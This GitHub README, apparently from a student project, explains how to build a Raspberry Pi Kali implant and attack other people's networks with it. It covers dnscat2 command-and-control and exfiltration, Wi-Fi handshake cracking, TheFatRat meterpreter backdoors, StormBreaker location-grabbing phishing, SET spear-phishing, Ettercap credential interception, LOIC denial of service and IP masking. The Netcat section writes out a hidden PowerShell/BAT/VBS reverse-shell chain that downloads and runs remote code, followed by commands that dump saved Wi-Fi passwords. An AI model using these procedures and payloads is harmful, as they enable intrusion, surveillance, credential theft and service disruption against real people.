## Content 
- [Flashing Kali to SD card](#flashing-kali-to-sd-card)
- [Wireless security](#wireless-security)
- [Airodump](#airodump)
  - [Automation Script](#automation-script)
  - [Using of the Automation script](#using-of-the-automation-script)
- [Zerotier Vpn](#zerotier-vpn)
- [TheFatRat](#thefatrat)
  - [Setup of TheFatRat](#setup-of-thefatrat)
  - [Execution of TheFatRat](#execution-of-TheFatRat)
  - [Main page of TheFatRat](#main-page-of-thefatrat)
  - [configuration](#configuration)
  - [Payload file](#payload-file)
  - [Target side of TheFatRat](#target-side-of-thefatrat-tool)
- [FinalRecon](#FinalRecon)
- [StormBreaker](#stormbreaker)
  - [Setting up StormBreaker](#setting-up-stormbreaker)
  - [Execution of StormBreaker](#execution-of-stormbreaker)
  - [Target side of StormBreaker](#target-side-of-stormbreaker)

 - [Social engineering tool](#social-engineering-tool)
   - [Target side of Social engineering tool](#target-side-of-social-engineering-tool)
   - [troubleshooting](#troubleshooting)  
 - [Nmap](#Nmap) 
 - [TcpDump](#tcpdump)  
   - [Setup TcpDump](#setup-tcpdump)  
 - [proxychain tor](#proxychain-tor)  
   - [Using of Proxychain](#using-of-proxychain)  
- [Recon-ng](#recon-ng)
  - [Using of Recon-ng](#using-of-recon-ng)
  - [Using of whois_procs](#using-of-whois_procs)
- [Ettercap](#ettercap)
  - [Installation of Ettercap](#installation-of-ettercap)
  - [Arp Scan](#Arp-Scan)
- [Low orbit ion cannon](#low-orbit-ion-cannon)
  - [Installation of Low orbit ion cannon](#installation-of-low-orbit-ion-cannon)
- [LOIC](#loic)
- [Tshark](#tshark)
  - [installation of Tshark](#installation-of-tshark)
- [Macchanger](#macchanger)
  - [Installation of Macchanger](#installation-of-Macchanger)
- [Maskphish](#maskphish)
  - [Installation of Maskphish](#installation-of-maskphish)
- [Impulse](#impulse)
  - [Installation of Impulse](#installation-of-impulse)
  - [using the impulse tool for email](#using-the-impulse-tool-for-email)  
- [Log4J](#log4j)  
  - [Installation of Log4J](#installation-of-log4j)  
- [VLC msfconsole](#vlc-msfconsole)
- [Netcat Reverse shell connection](#netcat-reverse-shell-connection)    
  - [FYP.ps1](#fyp.ps1) 
  - [FYP.bat](#fyp.bat)   
  - [FYP.vbs](#fyp.vbs)  
- [Wiping logs](#Wiping-logs)  
- [Macchanger](#Macchanger)
- [Remotely corrupting Kali linux](#Remotely-corrupting-Kali-linux)
   
# Project-Pinfiltrate
IOT device capable of performing network reconnaissance in a plug and play usage 
# Flashing Kali to SD Card    
### Step 1
Download the kali image from kali.org. Ensure that the download is from the ARM section as shown below. Do make sure that the correct version is chosen. In this case, the first option is used.  
![image](https://user-images.githubusercontent.com/97077110/148011185-c190b42a-90aa-4d15-bba8-10e33dcc2072.png)  
### Step 2  
Install raspberry pi imager from https://www.raspberrypi.com/software/. This will allow you to flash kali into the SD card for the raspberry pi to boot. After downloading the software, proceed to run the raspberry pi imager.   
![image](https://user-images.githubusercontent.com/97077110/148011274-6f40d8f2-cf6d-4c12-92b8-b21ea1df0d95.png)  
### Step 4  
Select the kali OS downloaded online and choose to install it onto the SD card. Next click write. This process should take 15 minutes.   

### Step 5
Insert the sd card into the raspberry pi and boot it up. It should turn on like a normal computer with Kali Linux OS.  

# Headless Setup:
To create a headless setup, we must configure the kali to autologin and auto connect to wifi. To do this,  I looked for the config file that was incharge of network connections (/etc/network/interfaces). 
Next, I edited the file to ensure kali auto connects to the network every time by adding the following.
```
auto wlan0
allow-hotplug wlan0
iface wlan0 inet manual
wpa-roam /etc/wpa_supplicant/wpa_supplicant.conf
iface default inet dhcp
```
Afterwards, kali began to auto reconnect to internet every time we log in.  

Finally, to complete the headless setup, I had to configure auto-login. To do so, I editted the following config files ```/etc/lightdm & /etc/pam.d/```.  
```
# /etc/lightdm
autologin-user=root

autologin-user-timeout=0

# /etc/pam.d/

auth required pam_succeed_if.so user != root quiet_success
```
After a reboot, kali will now 
	1. Auto Login without user input
	2. Auto reconnect to a previously connected network wirelessly (Wi-Fi)
	
# Command and Control  
Before infiltration and reconnaissance, we have to ensure that we are able to establish a connection with the pi remotely. Being able to do so allows the user to spawn a shell and interact with the pi and exfiltrate data out. This means that the pi has to bypass the firewall and establish a connection with the master computer from another network. This can be achieved by utilizing DNS service to evade firewall rules. We will be using dnscat2 developed by iagox64 on github. You may follow his installation guide or stick to ours.  
## Setting up the command side with dnscat2  
With dnscat2, your master computer MUST be running linux for this to work. This can be a bridged VM or a bare metal linux OS. In our walkthrough we proceeded with the VM as it allows us to revert back to snapshots easily whenever we need to.

### Step 1 (OPTIONAL)  
This step is only optional if you are not running linux on a VM.
To get started, download any linux VM on your computer. We stuck with kali to keep things simple. Head over to their official website and download their latest VM.
![image](https://user-images.githubusercontent.com/97077110/150625638-e09c1fb0-c679-455d-a8b5-f6245729622f.png)  
Next, run it and follow through their installation process  
Finally, run the VM on bridged network connection and ensure that it shares the same subnet as your host pc.
### Step 2  
Next, to setup DNScat2 on the master PC, key in the following commands  
```
$ sudo apt-get install ruby-dev

$ git clone https://github.com/iagox86/dnscat2.git

$ cd dnscat2/server/

$ gem install bundler

$ bundle install
```
### Step 3
After running all the commands above flawlessly, this machine is now ready to be a master PC. to start the DNS server, run the following commands  
```
$ cd dnscat2/server

$ sudo ruby ./dnscat2.rb
```  
The server should always be running before running the client (slave)
## Setting up dnscat2 on the raspberry pi  
After setting up the master, we move on to configuring the PI to send DNS packets to the master. To do so, ensure that the pi has internet connection.  
Next, run the following commands  
```
$ git clone https://github.com/iagox86/dnscat2.git

$ cd dnscat2/client/

$ make
```
## Setting up port forwarding  
In order for the traffic to reach the Master PC, we have to configure the router, a.k.a the C&C Server to forward packets to the master computer. Log into your router and navigate to port forwarding and ensure it is turned on. Since DNS operates on port 53, we will configure the router to listen for traffic coming from port 53. You may choose to specify a different port if you want to reduce traffic overhead. Next, specify the IP address of your master and ensure that it is a static ip address. Monitor for both UDP and TCP and save changes. 

## Establishing a connection with dnscat2
### Step 1
To begin, start up the dnscat2 server first on the master by running the command (sudo ruby ./dnscat2.rb)
### Step 2
On the master, google ‘what is my ip’ and take note of the public IP address displayed. This will be crucial in the next step.

### Step 3
On the raspberry pi, type the command  

`sudo ./dnscat --dns=server=your.public.ip.address,port=53`  
Remeber your ip address from the previous step? Apply it onto this command. After this, the connection should be established. type `help` to see the commands available  

## Exfiltrating Data  
Dnscat2 has many features such as opening a shell, tunneling, as well as uploading files. In the context of command and control, we will be focusing on their download feature. This feature will be crucial in exfiltrating files. Users can perform exfiltration in 2 simple steps

### Step 1  
Establish a connection between the Pi and the Master. Proceed to create a blank txt file on the master (sudo touch /path/of/blank/file.txt)
### Step 2
On the master pc, type in the command  
`download /path/of/data/you/want/to/exfiltrate.txt /path/of/blank/file.txt`  
Where the first directory belongs to the pi and the second directory belongs to the master pc.
#### TAKE NOTE!
When exfiltrating any other files like PCAP files, change the extension to txt file before exfiltrating. After the file is in your master pc, change it back to its original format (.pcap, .png, .xlsx)

# Wireless security  
An area of attack that the team decides to attack is targeting devices that use wireless connection. By using Raspberry PI and a Wifi adapter, we will be able to scan and discover potential networks and exploit these networks using the right tool. This section will cover tools that will be used to bypass wireless defenses and perform penetration testing.

# Airodump  
Now, let's change the Mac address of this interface to hide our true identity. Use macchanger to change your Mac to a random value and specify your interface. There are options to switch to another type of device; however, for this example, we will just leave it as a random Mac address using the following command: ```macchanger -r wlan0```.  

## Automation Script:  
We have used a automation script from Github to run airodump and airo crack. 
Download the file from [https://github.com/no0bie/Automate-Aircrack-ng](url) and extract the fil onto Desktop.  
The team have added an additional code into this automated script.    
```
def c():
        l =open("NODELETE.txt","w")
        x=raw_input("Your wireshark file name:")
        time.sleep(1)
        command= "aircrack-ng -w /usr/share/wordlists/rockyou.txt"+" "+x 
        l.close()
        os.system(command)

elif a == "-c":
                c()



print("-c       (6)     Attempt to crack password")
``` 
Because the original script does not have aircrack capabilities we have appented this code into the script to enhance its capabilities.  

We have also added sequence numbers to the script so that users are able to know which sequences come first.  
![image](https://user-images.githubusercontent.com/97077110/148357955-6c77bf3e-eacb-4549-9802-cdcb58103ed7.png)   
 
## Using of the Automation script:  

### Step 1  
Run the command ```$  python automation.py``` , a menu will be displayed.  
![image](https://user-images.githubusercontent.com/97077110/148013026-14b6dc58-f439-4c0d-bbac-b0a5d0d253ae.png)  
### Step 2  
Download any tools that is required, run the command ```$  python automation.py -i```.  
The monitor mode in the wireless card enables the device to listen to every packet around us. While Managed mode captures packets that have the device’s MAC address.Therefore for us to start capturing packets and discovering networks around us. We have to set our wireless device into Monitor mode.  
### Step 3 
We shall switch the interface from managed mode to monitor mode.Run the command ```$  python automation.py -si```.  
![image](https://user-images.githubusercontent.com/97077110/148358380-e7bc81f8-1c6e-448d-89a4-c5aea64ab841.png)  
### Step 4  
We will detect all the networks around us to find a potential target by running the command ```$  python automation.py -m``` 
### Step 5  
Monitor a network (Target's network) by using the command ```$  python automation.py -mc```
![image](https://user-images.githubusercontent.com/97077110/148358676-0ef954cb-d576-47f9-8c6d-7163e8515e59.png)   
### Step 6
Run the command ```automation.py -d```.  
The channel can be found in step 3 under **CH**.  
The Mac address can be found in step 3 under **BSSID**.  
Now, we will try to capture traffic from that wireless device, we have to wait until **EAPOL** appears befire we end the process.  
![image](https://user-images.githubusercontent.com/97077110/148359144-f19b2320-9c55-4fdd-a4cc-b29861ab903d.png)  
### Step 7:  
Run the command ```automation.py -c  ```.  
Enter the wireshark file name that you have save   
![image](https://user-images.githubusercontent.com/97077110/148503822-088080df-59bf-4966-a840-efebef3a563e.png)  


# Zerotier Vpn 
### Step 1
Head to [http://download.zerotier.com/debian/buster/pool/main/z/zerotier-one/](url) and locate the required file , which is zerotier-one_1.4.6_arm64.deb.  
![image](https://user-images.githubusercontent.com/97077110/148359739-81bbdd2a-da57-4bc2-9207-1ff761695c44.png)  
### Step 2
After locating the file , right click and click on *copy link address*. Next, head over to the Linux terminal , and key in ```wget http://download.zerotier.com/debian/buster/pool/main/z/zerotier-one/zerotier-one_1.4.6_arm64.deb```. The file will then be downloaded onto Linux.  
![image](https://user-images.githubusercontent.com/97077110/148359933-48ccb1f7-e5c5-4d9e-9fe0-37b8a86fc20c.png)  
### Step 3
The file can now be downloaded and de-packaged by using the command ``` sudo dpkg -i zerotier-one 1.4.6_arm64.deb```.  
![image](https://user-images.githubusercontent.com/97077110/148360115-637749e9-413e-41cd-8e44-19b35cb8f86e.png)  
### Step 4  
Zeroiter can be checked if it is successfully installed onto the Linux machine by using the command ```sudo zerotier-cli info```.  
![image](https://user-images.githubusercontent.com/97077110/148360322-f097fda5-5201-413d-ba35-678800f79c10.png)  
### Step 5  
Since zerotier is online, we can now procees to join a netowrk. However, to join a network, a Zerotier account is required. Thus, go to [https://my.zerotier.com/ ](url) and click on the create button to create a Zerotier account.  
![image](https://user-images.githubusercontent.com/97077110/148360560-8b898889-ba9d-441a-a09b-48d292d88067.png)  
### Step 6  
Click on *Create a network* on the Zerotier Central terminal and a network in Zerotier would then be created under your account.  
![image](https://user-images.githubusercontent.com/97077110/148360733-09c1932b-90fb-4bc8-af7b-e6ff47b2cb18.png)  
### Step 7  
copy the Network ID of the Zerotier network that you have created on the Linux terminal using command ```sudo zerotier-cli join networkID of your zerotier account```. In this situation, it would be *sudo zerotier-cli join d5e5fb653708e1db*.  
![image](https://user-images.githubusercontent.com/97077110/148361021-b77324f3-6590-4ec1-8dbf-b3977f5e26a6.png)  
### Step 8  
Use command ```sudo zerotier-cli peers``` to check if you have successfully joined the network. If successfully joined, people who are in the network will be shown.  
![image](https://user-images.githubusercontent.com/97077110/148361269-12c8e6ab-5981-4a51-b3a0-266951aa244b.png)  
### Step 9  
Wait for approximately 5 minutes on the Zerotier Central and refresh the page. New devices that had joined the network would be updated.  
![image](https://user-images.githubusercontent.com/97077110/148361514-01aeea67-14b6-4e87-83e6-761c589f987c.png)  
## Step 10  
Use command ```ip a``` on the Linux terminal to find out which ip address the Zerotier belongs to after you have successfully joined the network and Zerotier Central was shown appearing.  
![image](https://user-images.githubusercontent.com/97077110/148361807-a3fc424c-c973-49f7-9033-12061f5a7d9b.png)  
## Step 11  
Remote Desktop Conenction can now be established to the Raspberry Pi with the IP address of the Zerotier. In this situation, it would be *192.168.191.157*.  
![image](https://user-images.githubusercontent.com/97077110/148362548-4316e44d-dac1-4889-96d1-d1aa797d9357.png)  
Thus, Zerotier is now completely setup and you are able to remotely connect to the Raspberry Pi.  

# TheFatRat tool  

Installation of TheFatRat tool from GitHub.Run using command ```sudo git clone https://github.com/screetsec/TheFatRat```  
![image](https://user-images.githubusercontent.com/97077110/148495968-b5ff8cd0-f16e-4aaf-994b-9b7d19a233db.png)  
## Setup of TheFatRat tool
Use commmands   
```  
cd TheFatRat
sudo chmod +x setup.sh (allow permission)
sudo bash setup.sh
```  
![image](https://user-images.githubusercontent.com/97077110/148496107-f197f915-667b-435f-b1c4-083299940bd4.png)  
Keep settings default, **Select enter and yes**  
![image](https://user-images.githubusercontent.com/97077110/148496172-b5e27e9f-25fc-442e-936c-21b91890ba80.png)  
## Execution of TheFatRat  
Use commands  
```  
cd TheFatRat
sudo fatrat  
```  
![image](https://user-images.githubusercontent.com/97077110/148496278-23186611-7d9e-4ea5-9c19-32e138e680c4.png)  
![image](https://user-images.githubusercontent.com/97077110/148496307-1e2055d1-5ee9-46cc-add9-f2dffe326e00.png)  
## Main page of TheFatRat tool  
For the epxloit, we are aiming o use this tool to create a backdoor in the target machine. Thus, we are choosing Create FUD backdoor 1000% with PwnWinds:  
```[TheFatRat]-[~]:06```  
![image](https://user-images.githubusercontent.com/97077110/148496436-54769cfd-90af-4282-8bae-af5164e21b98.png)  
Since our target machine uses a Windows Operating system, we chose Create a bat file + Powershell.  
```[TheFatRat]-[~]-[pwnwind]:[1]```  
![image](https://user-images.githubusercontent.com/97077110/148496539-7c8eb1fb-279f-4a2f-9104-8d19818bfa8b.png)  
## Configuration  
Set LHOST IP  as  **Host IP**   
Set Lport to **8080**  
Output file name can be any file name:**Any name**  
![image](https://user-images.githubusercontent.com/97077110/148496662-81aaa312-fc1f-4733-9c74-803c18663ccf.png)  
![image](https://user-images.githubusercontent.com/97077110/148496679-182cd1d9-df85-41af-a85d-c2b948b466c1.png)  
Choose **Windows/meterpreter/reverese_https**  
To create a file that can be used to remote access the target
Choose Payload:**6**  
![image](https://user-images.githubusercontent.com/97077110/148496778-daf48909-16e2-44dd-ac14-4d637ae44571.png)  
## Payload file:  
The payload file is stored in FatRat_Generated directory.This directory store all the .bat files that are created.The payload file is then copy into the **/var/www/html/** directory.  
```  
sudo -i  
cd FatRat_Generated  
cp filename.bat /var/www/html/(directoryname)  
```  
![image](https://user-images.githubusercontent.com/97077110/148496890-5807789f-dde9-4777-93fe-f188dc84cef8.png)  

## Target side of TheFatRat tool:  
Go to browser and go to the Host IP address 172.16.35.14/FYP/  
![image](https://user-images.githubusercontent.com/97077110/148496961-ed19ae58-ddf2-4109-8c61-85709c90c3c8.png)  
Download the fyp.bat and run it on the target system.    

# FinalRecon:  
![image](https://user-images.githubusercontent.com/97077110/148497186-f611528c-e547-4776-bb86-9cfbb140916a.png)  
![image](https://user-images.githubusercontent.com/97077110/148497210-c8392428-8308-477f-9f60-419f48e264f4.png)  
![image](https://user-images.githubusercontent.com/97077110/148497246-e58cf561-df5f-445a-bc18-20c07db60587.png)  
![image](https://user-images.githubusercontent.com/97077110/148497283-6c3681c7-8271-42b4-945b-cd4532ed8ffb.png)  
![image](https://user-images.githubusercontent.com/97077110/148497306-cc6cf98a-06a4-4e9f-a67b-7f6e8446dff2.png)  


## StormBreaker  
![image](https://user-images.githubusercontent.com/97077110/148505490-62e933a2-4809-4a5f-b4b1-ced4ca922be7.png)  

To install stormbreaker use command git clone https://github.com/ultrasecurity/Storm-Breaker.git  

## Setting up StormBreaker  
### Step 1  
On linux terminal, Use commands.  
  
```cd Storm-Breaker```  
```sudo bash install.sh```  
  ![image](https://user-images.githubusercontent.com/97077110/148505656-3192afc8-f267-45bc-832d-bd86d02b2651.png)  
 ![image](https://user-images.githubusercontent.com/97077110/148505781-6b58edfd-a194-44ed-bc03-908436caf218.png)  



### Step 2  
Create a ngrok account for public url hosting.  
![image](https://user-images.githubusercontent.com/97077110/148505889-ff90b637-b977-426e-8fc6-875c297d1303.png)  
![image](https://user-images.githubusercontent.com/97077110/148505959-fdfc8ef8-38b3-4d46-b441-132ba5ec411b.png)  

  
### Step 3  
Append the authtoken into ngrok in kali using command sudo ngrok authtoken (your token number).  
```sudo ngrok authtoken (your token number)```  
![image](https://user-images.githubusercontent.com/97077110/148506008-49eb7a3d-fea4-4d97-9ba7-6b37016b1ad8.png)  
  
### Using StormBreaker  
### Step 1  
Use command  sudo python3 Storm-Breaker.py  
![image](https://user-images.githubusercontent.com/97077110/148506055-15f652d5-477b-4bb4-a06c-65617683e1f5.png)  

### Step 2  
We are attempting to get the location of the target.    
```[STORM-BREAKER@HOME]:$ 4```
![image](https://user-images.githubusercontent.com/97077110/148506182-ec9b6603-0c3d-43c3-bacf-ac1630e9ba2c.png)  

### Step 3  
Choose template :nearyou.  
```[STORM-BREAKER@HOME/GET-LOC/SELECT-TEMPLATE]:$ 1```  
![image](https://user-images.githubusercontent.com/97077110/148506323-24dd5d64-8004-4c7f-94b2-445868c5c20e.png)  

Copy the link and send to the target.  

Once the Target opens the link , he/she will be prompted to enable location, once the target enables the location, it will immediately send it back to the host machine.  

![image](https://user-images.githubusercontent.com/97077110/148506354-06429a3b-35ba-4844-abdf-67edfd3f1943.png)  

### Target side of StormBreaker  
The target will see this on his/her phone.
The Target will be prompt to on his/her location adn the location will be send to the attacker.  

![image](https://user-images.githubusercontent.com/97077110/148506539-51c2506c-a9fb-41a0-968e-b746419e08ce.png)  


The tool will provide the exact location using google map.   
![image](https://user-images.githubusercontent.com/97077110/148506581-d35cd297-9914-413b-b80e-b219597aae86.png)  
  


## Social engineering tool   
### Setup:  

### Step 1:  
Search Social engineering toolkit on kali    


![image](https://user-images.githubusercontent.com/97077110/148537649-316ffc26-2ab9-425d-aa3e-23a8dc297b54.png)  



### Step 2:  

Select option Social-Engineering Attacks
``` Set > 1```  
![image](https://user-images.githubusercontent.com/97077110/148537728-aa435ce9-c1f7-4f83-a34c-05bf7c334e27.png)  



### Step 3:
Then select  Mass Mailer attack  
```Set > 5```  
![image](https://user-images.githubusercontent.com/97077110/148537775-5be45f49-a403-46da-b150-4f3a616f4f99.png)  




### Step 4:
Then choose 1. E-mail Attack Single Email address(spear phishing)  

![image](https://user-images.githubusercontent.com/97077110/148537842-0c8eec64-73fe-4edb-9a8a-db6c7cc813f8.png)  



### Step 5:  
Enter target’s email  
Enter your email  
Enter the name the target will see  
Enter your email password   

![image](https://user-images.githubusercontent.com/97077110/148537979-165642b5-2cd6-44b0-9a1b-bef752926c5f.png)  


Select and customize the email and enter the suspicious link.   

![image](https://user-images.githubusercontent.com/97077110/148538000-2a25e7ec-f4af-4c1e-9262-6b031c983135.png)  



### Target side of Social Engineering tool :  

![image](https://user-images.githubusercontent.com/97077110/148538039-1d4a7b75-a10b-4cf5-bc6f-f157033fb82f.png)  



### Troubleshooting:  
There is a connection blocked by gmail as there is a safety feature that don't allow external application to access the email.  
![image](https://user-images.githubusercontent.com/97077110/148538157-1ba2eab5-fdb2-478a-b6f4-b0e25863ad56.png)  


We need to Turn off Less secure app access.  

![image](https://user-images.githubusercontent.com/97077110/148538192-927afed2-367a-416c-aaee-30c597250e96.png)  



## Nmap(Network mapper)  
![image](https://user-images.githubusercontent.com/97077110/148538577-435bcdd1-7511-4750-913e-6b3193e41897.png)  


Nmap is the most widely used open source program for scanning hosts and services on a network The sophisticated features of Nmap can detect many applications that operate on systems, as well as services such as the

Features for fingerprinting the operating system. Nmap is a powerful tool, but it can also be dangerous.
Unless utilized appropriately, it is clearly detectable. 
Nmap is best used in specific situations to prevent triggering a target's defense systems, avoid the following conditions.

Using of Nmap:
Nmap can be used to scan local networks.There are many commands that we can use to tune our scan.

```nmap 172.168.1.0/24```: This scans the entire class C range   
```nmap -p ```: This scans specific ports   
```nmap -sP 172.168.1.0/24```: This scans the network/find servers and devices that are running   
```nmap –iflist```: This shows host interfaces and routes   
```nmap –sV 172.168.1.1```: This detects remote services' version numbers   
```nmap –sS 172.168.1.1```: This performs a stealthy TCP SYN scan   
```nmap –sO 172.168.1.1```: This scans for the IP protocol   
```nmap -172.168.1.1 > output.txt```: This saves the output from the scan to the text file   
```nmap –sA 172.168.1.254```: This checks whether the host is protected by a firewall  
```nmap –PN 172.168.1.1```: This scans the host when it is protected by a firewall  
```nmap –F 172.168.1.1```: This perform a fast scan l  
```nmap --reason 172.168.1.1```: This displays the reason a port is in a particular state   
```nmap --open 172.168.1.1```: This only shows open or possibly open ports  
```nmap –O 172.168.1.1```: This scan shows the operating system   

## TcpDump
![image](https://user-images.githubusercontent.com/97077110/148880621-d0dbb0d5-9c09-450c-89f0-5c14be9cda77.png)  

Tcpdump is a packet analyzer that runs from the command line. TCP/IP and other packets that are transmitted through the network and seen by the system can be intercepted and displayed by using tcpdump. However the Raspberry Pi must be connected to the network to do so.  

### Installation of TcpDump:  
use command ```sudo apt-get install tcpdump``` to install tcpdump  
![image](https://user-images.githubusercontent.com/97077110/148543181-aec55008-fa02-4a00-99b8-053e773aeed2.png)  

use command ```sudo tcpdump``` to collect tcp packets   
![image](https://user-images.githubusercontent.com/97077110/148543279-37c47c72-785d-4010-a36a-11d5365cd9f4.png)  

use command ```sudo tcp-dump -D``` used to check available interfaces  
![image](https://user-images.githubusercontent.com/97077110/148543863-eee19f3f-1fa9-44b7-9e0d-f0f7fe3970f6.png)  

use command ```sudo tcpdump -i any -w example.pcap``` capture all connection from any interface and write to fyp.pcap file
![image](https://user-images.githubusercontent.com/97077110/148544451-d9a9459d-647b-4c92-8179-1d521c9af03b.png)  

use command ```tcpdump -r example.pcap``` to read the captured packet pcap file. 
![image](https://user-images.githubusercontent.com/97077110/150912644-5d5f52e5-1d61-47cc-a74a-2a43a5f924e5.png)

# Ettercap:  
A tool that is used for man-in-the middle attacks which includes ARP spoofing, sniffing of live connections and is able to intercept and modify packets flowing through the network.  

## Installation of Ettercap:  
use command ``` Sudo apt-get install ettercap-common``` to install ettercap.  
![image](https://user-images.githubusercontent.com/97077110/148885495-9d4eb8c0-0f77-47ab-8abc-784b032fea4e.png)  
To run the Ettercap software use command ```ettercap -G```  
![image](https://user-images.githubusercontent.com/97077110/148885707-d7a1853c-af4c-45f6-a7cf-f06db0399231.png)  
This is the Ettercap gui interface:  
![image](https://user-images.githubusercontent.com/97077110/148885937-a9e2ae37-4f94-4d80-87ff-36d6b442b29b.png)  
Click on the lookup button to start unified sniffing  
![image](https://user-images.githubusercontent.com/97077110/148886145-e489d4af-c084-4346-988f-17c079bfbc65.png)   
Scan the host by clicking on the icon  
![image](https://user-images.githubusercontent.com/97077110/148886171-abce0b61-9d5b-4a2c-b53e-99f8fe1a917a.png)   
The available host will be shown  
![image](https://user-images.githubusercontent.com/97077110/148886196-2dc8fb7b-02d3-4209-b881-f10b66b51cb4.png)   
Select the ip address to attack and add to target 1.  
To use ARP poisoning to intercept the communication between the devicesm click on circle sign and then arp poisoning:  
![image](https://user-images.githubusercontent.com/97077110/148886264-98b75905-957b-4399-b656-8ffd6773309c.png)  
After ticking the sniff remote connections, click ok and the arp poisoning sill start.  
![image](https://user-images.githubusercontent.com/97077110/148886289-f5dce947-efda-446a-89c7-ca150cb26d71.png)  
On the target side, this is how it looks like where they should enter the credentials:  
![image](https://user-images.githubusercontent.com/97077110/150915184-45a9a060-6a48-412f-87fc-2fc2aac4c11e.png)  
After victim enter the credentials, this is how it will look like after it is successfully intercepted.  
![image](https://user-images.githubusercontent.com/97077110/150915470-e430dae4-075d-45cd-b5af-30b3ef6b05e4.png)  

## Arp Scan:  
Fast packet scanner tool that can detect active ip addresses in the subnet that is on the local network.  
Command : ```sudo arp-scan -localnet```     
![image](https://user-images.githubusercontent.com/97077110/150924394-8d4f8b9b-d621-4d62-bed9-9245d1a6d405.png)  

# Netcat Reverse shell connection:  

On the Attacker side :  
Open a listener for any incoming connection using command  
```stty raw -echo; (stty size; cat) | nc -lvnp 3001```  
![image](https://user-images.githubusercontent.com/97077110/150916396-4038a1cd-cf85-4154-891c-b926194a29d5.png)  
After which on the client side to run powershell hidden, there are 3 files that we need to use.  
![image](https://user-images.githubusercontent.com/97077110/150916525-7c904cbe-edf3-49a7-b15a-f62de4ba4299.png)  

### Fyp.ps1:  
This file contain the main payload that will be use to create reverse shell command   
```IEX(IWR https://raw.githubusercontent.com/antonioCoco/ConPtyShell/master/Invoke-ConPtyShell.ps1 -UseBasicParsing); Invoke-ConPtyShell (Host IP) (listener port)```
![image](https://user-images.githubusercontent.com/97077110/149295156-d2d06499-aedc-4c88-bd7b-d002f6f08635.png)

### Fyp.bat:  
Create a .bat file and use the command powershell.exe -ExecutionPolicy Bypass C:\fyp.ps1.   
This file will point to the payload file .ps1  

Command :```powershell.exe -ExecutionPolicy Bypass C:\fyp.ps1```  

### Fyp.vbs:  
This script is set to create a Wscript shell and point to the .bat file  

Use command:  
```
Set WinScriptHost = CreateObject("WScript.Shell")  
WinScriptHost.Run Chr(34) & "C:\fyp.bat" & Chr(34), 0  
Set WinScriptHost = Nothing 
```
  
Once these three files are downloaded and placed in the C: drive. We just have to run the .vbs file and a reverse shell connection will be created.  

![image](https://user-images.githubusercontent.com/97077110/149295328-68fb39f5-d2cc-40b3-8ad5-5f9b5bfa7c22.png)  


From reverse shell:  
We can view the directory of the target computer/server using command ```dir```. 

We can view the Users in the target computer/server ```Get-LocalUser ``` 
![image](https://user-images.githubusercontent.com/97077110/149295392-5e7e8718-c681-4eba-8857-a29917067be9.png)   

We can view the the Wifi interfaces that the target computer connected and get a clear view of the password using command
```netsh wlan show profiles```  

![image](https://user-images.githubusercontent.com/97077110/149295458-d8e2841a-3c49-4d4e-87a2-e10afbc0d876.png)  
Use the command ```Netsh wlan show profile name=” (Wifi SSID)” key=clear``` to show the password of the WIFI.   
![image](https://user-images.githubusercontent.com/97077110/149295654-529d5e72-5bce-4d26-8c3e-e694358f081d.png)
We can view the running process on the target computer/server using command ```Get-process```  
![image](https://user-images.githubusercontent.com/97077110/149295717-bddc35a0-6346-4b4b-99ca-461593367fd4.png)  

use command ```Get-Content (file path )```to view the text file on the target computer/server:
![image](https://user-images.githubusercontent.com/97077110/149295773-11b9d86b-ac2d-4580-b3cd-20f040db2460.png)

We can clear the content of the file while retaining the item of itself using command ```Clear-Content (file path)```

![image](https://user-images.githubusercontent.com/97077110/149295848-a8fac2ec-cc09-469b-b3ac-0e0be48e36e8.png)  

# Low orbit ion cannon:  
A tool that is used for stress testing and DOS attacks. 
## Installation of Low orbit ion cannon 
 
### Step 1: 
Download LOIC software on google, use the Sourceforge link to download the software  
![image](https://user-images.githubusercontent.com/97077110/148886414-3366e23f-1018-4874-8fdf-cbb5157e0050.png)  
![image](https://user-images.githubusercontent.com/97077110/148886444-317ac4c7-fc1c-4d12-ac8a-a3c5571908f6.png)  
### Step 2: 
Save File into Downloads directory  
![image](https://user-images.githubusercontent.com/97077110/148886476-2eb3ce0d-4b32-499d-b96c-54c5aa992b5e.png)  
### Step 3: 
Extract the file out  
![image](https://user-images.githubusercontent.com/97077110/148886535-3881bfa4-0177-4fe8-adfe-8df23ee09331.png)  
### Step 4: 
Install the mono tool to help us use the executable software by using command ```sudo apt install mono-complete```  
![image](https://user-images.githubusercontent.com/97077110/148886720-8a9ec717-f3aa-4821-b650-a7b498585457.png)  
# LOIC  
use command ```mono LOIC.exe```  to use the LOIC tool 
![image](https://user-images.githubusercontent.com/97077110/148887634-1d4f253e-4a37-4d08-a605-501d33ba6cbe.png)  
![image](https://user-images.githubusercontent.com/97077110/148887661-5ac9ba8c-eca3-4689-839a-4c98fa2afe0a.png)    

This is the main page of the LOIC:   

![image](https://user-images.githubusercontent.com/97077110/150096957-d8e4dcfc-f0ff-4a75-8991-74aeacfe3e6d.png)


Use wireshark to see the packets to show that the DOS attack is successful:  
![image](https://user-images.githubusercontent.com/97077110/150097039-1c9b4eb3-ad4f-4409-9813-b23eea55c464.png)

## Proxychain tor:  
Proxychains is a UNIX application that allows us to mask our legitimate IP address by redirecting network traffic. It routes our TCP traffic through a variety of proxies, including TOR, SOCKS4, SOCKS5, and HTTP (S). Proxychain can be used alongside with tools and application such as nmap to mask the true ip address of our host machine.    

![image](https://user-images.githubusercontent.com/97077110/148881122-7ec89a23-a4d7-4364-a796-01540e30b3ae.png)  

Installation and setup of Proxychain:  

### Step 1:  

```$ sudo apt-get install proxychains  tor```
![image](https://user-images.githubusercontent.com/97077110/148881168-b78b4c58-f39c-44c4-a5e3-c926bdacd7f9.png)  


### Step 2:  
```Sudo nano /etc/proxychains.conf```  
![image](https://user-images.githubusercontent.com/97077110/148881238-9083998b-cd1c-489f-8b2a-955989efef81.png)  

### Step 3:  
```nano /etc/proxychains.conf```  
Delete # at dynamic_chain  
![image](https://user-images.githubusercontent.com/97077110/148881388-163894fc-6192-4fa2-acf4-63874f9abe8c.png)  

### Step 4:
```sudo systemctl enable tor.service``` 

![image](https://user-images.githubusercontent.com/97077110/148881455-e4d091d4-0997-4e3e-ae1d-6bca4ef77cfd.png)  

## Using of Proxychain:  
```Proxychains firefox google.com ```
![image](https://user-images.githubusercontent.com/97077110/148881485-d9473769-1d43-4d9a-bb42-dd8a4f9344a8.png)  

From here it show that when we use firefox.exe, our location is in United Kingdom, not in Singapore.  

![image](https://user-images.githubusercontent.com/97077110/148881496-1ce3b2ec-6be3-4990-8eae-f4a994aec93a.png)  

Proxychain NMAP:  
